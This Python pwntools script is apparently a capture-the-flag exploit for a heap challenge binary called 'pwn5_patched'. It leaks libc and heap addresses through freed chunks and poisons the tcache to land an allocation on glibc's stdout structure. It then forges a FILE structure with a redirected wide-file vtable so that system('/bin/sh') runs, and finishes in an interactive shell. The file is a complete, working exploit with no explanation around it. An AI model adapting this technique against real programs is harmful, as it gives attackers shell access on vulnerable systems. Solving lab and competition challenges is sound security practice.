#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 13339
HOST = "localhost"
exe = context.binary = ELF('./pwn5_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            # add
            brva 0x00000000000013F1
            brva 0x000000000000153D
            b* _IO_wfile_overflow

            # show
            brva 0x00000000000015FC
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, size, data = b'abcd'):
	p.sendlineafter(b'>> ', str(1))
	p.sendlineafter(b'number : ', str(idx))
	p.sendlineafter(b'(bytes) : ', str(size))
	p.sendafter(b'information : ', data)

def show(idx):
	p.sendlineafter(b'>> ', str(2))
	p.sendlineafter(b'number : ', str(idx))

def free(idx):
	p.sendlineafter(b'>> ', str(3))
	p.sendlineafter(b'number : ', str(idx))

# VARIABLE


# PAYLOAD
add(0, 0x420)
add(1, 0x420)
add(2, 0x100)
free(1)
free(0)
show(0)
p.recvuntil(b'[0]:\n')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x21ace0
log.info("Libc base: " + hex(libc.address))

free(2)
show(2)
p.recvuntil(b'[2]:\n')
heap_leak = u64(p.recv(5) + b'\0'*3)
heap_base = heap_leak << 12
log.info("Heap base: " + hex(heap_base))
stdout = libc.sym._IO_2_1_stdout_
io_wfile_jumps = libc.sym._IO_wfile_jumps
system = libc.sym.system

target = stdout ^ ((heap_base + 0x6d0) >> 12)
payload = flat(
	b'\0'*0x428, 0x111,
	target
	)
add(3, 0x500, payload)
free(1)
free(3)
add(3, 0x500, payload)
add(4, 0x100, p64(heap_base + 0x6d0 - 0x60) + p64(system))
payload = b'  /bin/sh'
payload = payload.ljust(0x88, b'\0') + p64(heap_base)
payload = payload.ljust(0xa0, b'\0') + p64(heap_base + 0x6d0 - 0xe0)
payload = payload.ljust(0xc0, b'\0') + p32(0xffffffff)
payload = payload.ljust(0xd8, b'\0') + p64(io_wfile_jumps - 0x20)
add(5, 0x100, payload)

p.interactive()